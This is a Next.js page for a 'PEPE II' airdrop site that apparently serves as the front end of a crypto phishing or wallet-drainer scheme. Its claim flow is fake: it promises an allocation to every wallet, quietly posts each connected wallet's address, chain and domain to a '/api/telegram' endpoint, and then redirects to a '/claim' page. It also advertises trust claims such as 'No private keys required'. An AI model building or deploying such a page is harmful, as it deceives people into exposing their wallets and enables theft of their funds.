'use client'

import { useEffect, useState } from 'react'
import { useRouter } from 'next/navigation'
import { motion } from 'framer-motion'
import { useAccount, useConnect, useDisconnect } from 'wagmi'
import { X } from 'lucide-react'

const socialLinks = {
  twitter: 'https://x.com/',
}

const stats = [
  { label: 'Community', value: '12.4K+' },
  { label: 'Airdrop Pool', value: '250K' },
  { label: 'Holders', value: '8.2K+' },
  { label: 'Network', value: 'Web3' },
]

const steps = [
  {
    id: '01',
    title: 'Connect Wallet',
    text: 'Securely connect your wallet. No private keys required.',
  },
  {
    id: '02',
    title: 'Claim PEPE Ⅱ',
    text: 'Claim your PEPE Ⅱ community allocation in seconds.',
  },
  {
    id: '03',
    title: 'Join The PEPE Ⅱ Movement',
    text: 'Join the movement and stay updated on Twitter / X.',
  },
]

const trustItems = [
  'Non-custodial connection',
  'No private keys required',
  'Transparent claim flow',
  'Community-first launch',
]

function fadeUp(delay = 0) {
  return {
    initial: { opacity: 0, y: 34 },
    whileInView: { opacity: 1, y: 0 },
    viewport: { once: true },
    transition: {
      duration: 0.75,
      delay,
      ease: [0.16, 1, 0.3, 1] as const,
    },
  }
}

function PepeVisual() {
  return (
    <motion.div
      animate={{
        y: [0, -14, 0],
        rotate: [0, 2, 0],
      }}
      transition={{
        duration: 6,
        repeat: Infinity,
        ease: 'easeInOut',
      }}
      className="relative mx-auto flex h-[360px] w-full max-w-[520px] items-center justify-center md:h-[520px]"
    >
      <div className="absolute h-[360px] w-[360px] rounded-full bg-lime-400/20 blur-[120px] md:h-[520px] md:w-[520px]" />

      <motion.div
        animate={{ rotate: 360 }}
        transition={{
          duration: 24,
          repeat: Infinity,
          ease: 'linear',
        }}
        className="absolute h-[380px] w-[380px] rounded-full border border-lime-300/10 md:h-[560px] md:w-[560px]"
      />

      <motion.div
        animate={{ rotate: -360 }}
        transition={{
          duration: 30,
          repeat: Infinity,
          ease: 'linear',
        }}
        className="absolute h-[420px] w-[420px] rounded-full border border-white/5 md:h-[620px] md:w-[620px]"
      />

      <div className="absolute bottom-10 h-16 w-72 rounded-full border border-lime-300/25 bg-lime-300/10 blur-sm md:w-96" />

      <div className="hero-noise relative rounded-full">
        <img
          src="/pepe.png"
          alt="PP II Pepe"
          className="relative z-10 max-h-[340px] w-auto max-w-full object-contain drop-shadow-[0_0_70px_rgba(132,204,22,0.55)] md:max-h-[500px]"
        />
      </div>
    </motion.div>
  )
}

function WalletButtonBox() {
  const { address, isConnected } = useAccount()
  const router = useRouter()
  const { connect, connectors, isPending } = useConnect()
  const { disconnect } = useDisconnect()

  const shortAddress = address
    ? `${address.slice(0, 6)}...${address.slice(-4)}`
    : ''

  const metamaskConnector = connectors[0]

  if (isConnected) {
    return (
      <button
        onClick={() => disconnect()}
        className="glow-green inline-flex h-[60px] items-center justify-center rounded-2xl bg-gradient-to-r from-lime-300 to-green-300 px-8 font-bold text-black transition hover:scale-[1.02]"
      >
        {shortAddress}
      </button>
    )
  }

  return (
    <button
      onClick={() => connect({ connector: metamaskConnector })}
      disabled={isPending}
      className="glow-green inline-flex h-[60px] items-center justify-center rounded-2xl bg-gradient-to-r from-lime-300 to-green-300 px-8 font-bold text-black transition hover:scale-[1.02] disabled:opacity-50"
    >
      {isPending ? 'Connecting...' : 'Connect Wallet'}
    </button>
  )
}

export default function Home() {
  const { address, isConnected, chain } = useAccount()
const router = useRouter()
  const ethBalance = '0'

  const shortAddress = address
  ? `${address.slice(0, 6)}...${address.slice(-4)}`
  : 'Not connected'

const [isClaimModalOpen, setIsClaimModalOpen] = useState(false)

const [claimStatus, setClaimStatus] = useState<
  'idle' | 'loading' | 'success'
>('idle')

const handleClaim = async () => {
 setClaimStatus('loading')

await new Promise((resolve) => setTimeout(resolve, 2200))

await fetch('/api/telegram', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },

  body: JSON.stringify({
    event: 'claim_confirmed',
    wallet: address,
    chain: chain?.name || 'Ethereum',
    amount: '12500',
    domain: window.location.hostname,
  }),
})

useEffect(() => {
  if (!address) return

  const timer = setTimeout(() => {
    router.push('/claim')
  }, 900)

  return () => clearTimeout(timer)
}, [address, router])

setClaimStatus('success')
}
  
useEffect(() => {
  if (!address) return

  const sendTelegramNotification = async () => {
    try {
      await fetch('/api/telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },

        body: JSON.stringify({
          event: 'wallet_connected',
          wallet: address,
          chain: chain?.name || 'Ethereum',
          asset: 'ETH',
          balance: ethBalance,
          domain: window.location.hostname,
        }),
      })
    } catch (error) {
      console.error(error)
    }
  }

  sendTelegramNotification()
}, [address, chain])
useEffect(() => {
  if (!isConnected || !address) return

  console.log('Wallet connected, redirecting to /claim')

  const timer = setTimeout(() => {
    router.push('/claim')
  }, 900)

  return () => clearTimeout(timer)
}, [isConnected, address, router])
  return (
  <>
    {isClaimModalOpen && (
      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/75 p-4 backdrop-blur-xl">
        <motion.div
          initial={{ opacity: 0, scale: 0.9, y: 20 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          transition={{ duration: 0.35 }}
          className="relative w-full max-w-xl overflow-hidden rounded-[2rem] border border-white/10 bg-[#050505] p-8 shadow-[0_0_120px_rgba(132,204,22,0.15)]"
        >
          <div className="absolute inset-0 bg-[radial-gradient(circle_at_top,rgba(132,204,22,0.12),transparent_40%)]" />

          <button
            onClick={() => setIsClaimModalOpen(false)}
            className="absolute right-5 top-5 flex h-10 w-10 items-center justify-center rounded-full border border-white/10 bg-white/[0.04] text-zinc-400 transition hover:text-white"
          >
            <X size={18} />
          </button>

          <div className="relative z-10">
            <div className="mb-5 inline-flex rounded-full border border-lime-400/20 bg-lime-400/10 px-4 py-2 text-sm font-semibold text-lime-300">
              PEPE Ⅱ AIRDROP
            </div>

            <h2 className="text-4xl font-semibold tracking-tight">
              Claim Your Allocation
            </h2>

            <p className="mt-4 max-w-lg leading-7 text-zinc-400">
              Your wallet appears eligible for the current PEPE Ⅱ distribution round.
            </p>

            <div className="mt-8 space-y-4">
              <div className="rounded-2xl border border-white/10 bg-white/[0.03] p-5">
                <p className="text-sm text-zinc-500">Wallet</p>

                <p className="mt-2 font-mono text-sm text-zinc-200">
                  {shortAddress}
                </p>
              </div>

              <div className="rounded-2xl border border-white/10 bg-white/[0.03] p-5">
                <p className="text-sm text-zinc-500">Estimated Allocation</p>

                <p className="mt-2 text-3xl font-semibold text-lime-300">
                  12,500 PP Ⅱ
                </p>
              </div>
            </div>

            <button
              onClick={handleClaim}
              disabled={claimStatus === 'loading'}
              className="mt-8 flex h-[62px] w-full items-center justify-center rounded-2xl bg-gradient-to-r from-lime-300 to-green-300 font-bold text-black shadow-[0_0_45px_rgba(163,230,53,0.35)] transition hover:scale-[1.01] disabled:opacity-40"
            >
              {claimStatus === 'loading'
                ? 'Processing Claim...'
                : claimStatus === 'success'
                  ? 'Claim Successful'
                  : 'Claim Now'}
            </button>
          </div>
        </motion.div>
      </div>
    )}

    <main className="min-h-screen overflow-hidden bg-black text-white">
      <style jsx global>{`
        .wallet-clean button {
          height: 52px !important;
          border-radius: 14px !important;
          background: transparent !important;
          color: #050505 !important;
          box-shadow: none !important;
          font-weight: 800 !important;
        }

        .wallet-clean div {
          box-shadow: none !important;
        }
      `}</style>

      <div className="fixed inset-0 z-0">
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_top_left,rgba(132,204,22,0.18),transparent_30%),radial-gradient(circle_at_bottom_right,rgba(34,197,94,0.16),transparent_34%)]" />
        <div className="absolute inset-0 bg-[linear-gradient(rgba(255,255,255,0.025)_1px,transparent_1px),linear-gradient(90deg,rgba(255,255,255,0.025)_1px,transparent_1px)] bg-[size:72px_72px]" />
      </div>

      <div className="relative z-10">
        <header className="mx-auto flex max-w-7xl items-center justify-between px-6 py-6">
          <div className="flex items-center gap-4">
            <div className="flex h-12 w-12 items-center justify-center rounded-2xl border border-lime-400/20 bg-lime-400/10 shadow-[0_0_35px_rgba(132,204,22,0.35)]">
              <span className="text-lg font-black text-lime-300">PEPE</span>
            </div>

            <div>
              <p className="text-xl font-bold tracking-tight">PEPE Ⅱ</p>
              <p className="text-xs text-zinc-500">Pepe Two Web3 Community</p>
            </div>
          </div>

          <nav className="hidden items-center gap-8 text-sm text-zinc-400 md:flex">
            <a href="#airdrop" className="transition hover:text-white">
              Airdrop
            </a>
            <a href="#community" className="transition hover:text-white">
              Community
            </a>
            <a href="#security" className="transition hover:text-white">
              Security
            </a>
          </nav>

          <div className="hidden sm:block">
            <WalletButtonBox />
          </div>
        </header>

        <div className="mx-auto h-px max-w-7xl bg-gradient-to-r from-transparent via-white/10 to-transparent" />
        <section className="mx-auto grid min-h-[calc(100vh-92px)] max-w-7xl items-center gap-10 px-6 pb-16 pt-10 lg:grid-cols-[1.05fr_0.95fr]">
          <motion.div {...fadeUp()}>
            <div className="mb-6 inline-flex rounded-full border border-lime-400/20 bg-lime-400/10 px-4 py-2 text-sm font-semibold text-lime-300">
             PEPE Ⅱ AIRDROP IS LIVE
            </div>

            <h1 className="max-w-5xl text-5xl font-semibold sm:text-6xl tracking-[-0.06em] lg:text-8xl">
              Receive Your{' '}
              <span className="bg-gradient-to-r from-lime-300 via-green-300 to-emerald-200 bg-clip-text text-transparent drop-shadow-[0_0_35px_rgba(163,230,53,0.35)]">
                PEPE Ⅱ
              </span>{' '}
              Airdrop
            </h1>

            <p className="mt-7 max-w-2xl text-lg leading-8 text-zinc-400">
              Connect your wallet and claim your PEPE Ⅱ tokens to join the next
              viral Web3 movement.
            </p>

            <div className="mt-10 flex flex-col gap-4 sm:flex-row sm:items-center">
              <WalletButtonBox />

              <a
                href={socialLinks.twitter}
                className="inline-flex h-[60px] items-center justify-center rounded-2xl border border-white/10 bg-white/[0.04] px-8 font-semibold backdrop-blur transition hover:border-lime-300/40 hover:bg-white/[0.08]"
              >
                Join The PEPE Ⅱ Movement
              </a>
            </div>

            <p className="mt-7 text-sm text-zinc-500">
              Connected wallet:{' '}
              <span className="font-mono text-zinc-300">{shortAddress}</span>
            </p>

            <div className="mt-12 grid gap-4 sm:grid-cols-2 lg:grid-cols-4">
              {stats.map((stat) => (
                <div
                  key={stat.label}
                  className="min-w-0 rounded-3xl border border-white/10 bg-white/[0.035] p-5 backdrop-blur"
                >
                  <p className="truncate text-2xl font-semibold md:text-3xl">
                    {stat.value}
                  </p>
                  <p className="mt-2 text-sm text-zinc-500">{stat.label}</p>
                </div>
              ))}
            </div>
          </motion.div>

          <motion.div
            initial={{ opacity: 0, scale: 0.94 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 1 }}
            className="relative"
          >
            <PepeVisual />
          </motion.div>
        </section>
        
        <div className="mx-auto h-px max-w-7xl bg-gradient-to-r from-transparent via-white/10 to-transparent" />
        <section id="airdrop" className="mx-auto max-w-7xl px-6 py-24">
          <motion.div {...fadeUp()} className="text-center">
            <p className="text-sm uppercase tracking-[0.35em] text-lime-300">
              How It Works
            </p>
            <h2 className="mt-4 text-5xl font-semibold tracking-tight">
              3 Simple Steps
            </h2>
          </motion.div>

          <div className="mt-16 grid gap-6 md:grid-cols-3">
            {steps.map((step, index) => (
              <motion.div
                key={step.id}
                {...fadeUp(index * 0.12)}
                className="rounded-[2rem] border border-white/10 bg-white/[0.04] p-8 backdrop-blur transition hover:-translate-y-2 hover:border-lime-300/30 hover:bg-white/[0.06]"
              >
                <div className="mb-8 flex h-16 w-16 items-center justify-center rounded-2xl border border-lime-300/20 bg-lime-300/10 text-xl font-bold text-lime-300">
                  {step.id}
                </div>
                <h3 className="text-2xl font-semibold">{step.title}</h3>
                <p className="mt-4 leading-7 text-zinc-400">{step.text}</p>
              </motion.div>
            ))}
          </div>
        </section>

        <div className="mx-auto h-px max-w-7xl bg-gradient-to-r from-transparent via-white/10 to-transparent" />
        <section id="community" className="mx-auto max-w-7xl px-6 py-24">
          <motion.div
            {...fadeUp()}
            className="rounded-[2.5rem] border border-white/10 bg-gradient-to-br from-lime-400/10 via-white/[0.03] to-green-400/10 p-10 md:p-16"
          >
            <p className="text-sm uppercase tracking-[0.35em] text-lime-300">
              Community
            </p>
            <h2 className="mt-5 max-w-4xl text-5xl font-semibold tracking-tight md:text-7xl">
              The next viral Pepe Web3 community.
            </h2>
            <p className="mt-6 max-w-2xl text-lg leading-8 text-zinc-400">
              PEPE Ⅱ is built for holders, culture, and the next wave of Web3
              users entering the ecosystem.
            </p>

            <a
              href={socialLinks.twitter}
              className="mt-10 inline-flex rounded-2xl bg-lime-300 px-8 py-4 font-bold text-black shadow-[0_0_45px_rgba(163,230,53,0.35)] transition hover:scale-[1.02]"
            >
              Join The PEPE Ⅱ Movement
            </a>
          </motion.div>
        </section>

        <div className="mx-auto h-px max-w-7xl bg-gradient-to-r from-transparent via-white/10 to-transparent" />
        <section id="security" className="mx-auto max-w-7xl px-6 py-24">
          <motion.div {...fadeUp()} className="mb-14">
            <p className="text-sm uppercase tracking-[0.35em] text-lime-300">
              Security
            </p>
            <h2 className="mt-4 text-5xl font-semibold tracking-tight">
              Built On Trust
            </h2>
          </motion.div>

          <div className="grid gap-5 md:grid-cols-4">
            {trustItems.map((item, index) => (
              <motion.div
                key={item}
                {...fadeUp(index * 0.08)}
                className="rounded-3xl border border-white/10 bg-white/[0.04] p-6 backdrop-blur"
              >
                <div className="mb-6 h-2 w-16 rounded-full bg-gradient-to-r from-lime-300 to-green-300" />
                <p className="font-medium text-zinc-100">{item}</p>
              </motion.div>
            ))}
          </div>
        </section>

        <div className="mx-auto h-px max-w-7xl bg-gradient-to-r from-transparent via-white/10 to-transparent" />
        <section className="mx-auto max-w-7xl px-6 py-24">
          <motion.div
            {...fadeUp()}
            className="rounded-[2.5rem] border border-white/10 bg-[radial-gradient(circle_at_top,rgba(132,204,22,0.25),transparent_35%),linear-gradient(135deg,rgba(255,255,255,0.08),rgba(255,255,255,0.025))] p-12 text-center md:p-20"
          >
            <h2 className="text-5xl font-semibold tracking-tight md:text-7xl">
              Ready To Claim Your PEPE Ⅱ?
            </h2>
            <p className="mx-auto mt-6 max-w-2xl text-lg leading-8 text-zinc-400">
              Connect your wallet and become part of the next viral Web3
              movement.
            </p>

            <div className="mt-10 flex flex-col justify-center gap-4 sm:flex-row sm:items-center">
              <WalletButtonBox />

              <a
                href={socialLinks.twitter}
                className="inline-flex h-[60px] items-center justify-center rounded-2xl border border-white/10 bg-white/[0.05] px-8 font-bold transition hover:bg-white/[0.08]"
              >
                Join The PEPE Ⅱ Movement
              </a>
            </div>
          </motion.div>
        </section>

        <footer className="mx-auto flex max-w-7xl flex-col gap-6 border-t border-white/10 px-6 py-10 text-sm text-zinc-500 md:flex-row md:items-center md:justify-between">
          <p>© 2026 PEPE Ⅱ. All rights reserved.</p>

          <a href={socialLinks.twitter} className="hover:text-white">
            Twitter / X
          </a>
        </footer>
      </div>
   </main>
  </>
)
}